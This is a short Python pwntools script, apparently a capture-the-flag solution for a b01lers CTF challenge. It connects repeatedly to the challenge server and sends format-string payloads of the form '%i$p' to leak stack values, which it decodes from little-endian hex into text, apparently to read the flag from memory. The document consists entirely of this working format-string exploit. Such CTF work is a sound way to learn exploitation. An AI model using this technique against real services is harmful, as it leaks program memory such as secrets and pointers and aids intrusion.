#!/usr/bin/env python
from pwn import *

context.bits= '64'
context.endian= 'little'
#context.log_level = 'debug'

for i in range(1, 20):
    conn = remote('pwn.ctf.b01lers.com', 1002)
    conn.recvuntil("Where are we going?\n")
    payload = f"%{i}$p"
    conn.sendline(payload)
    context.log_level = 'error'
    while 1<2:
        try:
            print("".join(map(chr, unhex(conn.recvlineS().strip()[2:])[::-1])), end ='')
        except EOFError as e:
            break
        except UnicodeDecodeError as e2:
            continue
print()
